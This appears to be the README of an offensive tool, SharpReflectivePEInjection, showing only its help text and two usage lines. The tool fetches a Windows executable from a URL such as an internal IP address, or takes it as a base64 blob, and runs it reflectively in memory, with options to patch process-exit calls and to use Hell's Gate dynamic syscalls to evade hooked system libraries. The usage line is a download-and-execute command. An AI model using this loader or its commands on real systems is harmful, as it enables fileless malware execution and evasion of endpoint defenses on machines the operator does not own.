# SharpReflectivePEInjection

```
.\SharpReflectivePEInjection.exe -help

-url,-u         url to the binary to download

-Args,-args,-a  Arguments to be passed to Exe [Optional]

-b64PE          pass the entire PE as B64 encoded blob (if you are a mad person)

-patch_exit     Patch CorExit and ExitProcess to ExitThread [you know what is it if you need it XD]

-syscalls       Instead of Mapping ntdll, will use dynamic syscalls [Hell's Gate Technique]

-help           Display this help screen.


usage: .\SharpReflectivePEInjection.exe -url http://10.10.10.10/exe.exe [Optional: -Args "<EXE_ARGS>"]
usage: .\SharpReflectivePEInjection.exe -b64PE <BASE64 PE_BLOB> [Optional: -Args " <EXE_ARGS>"]
```
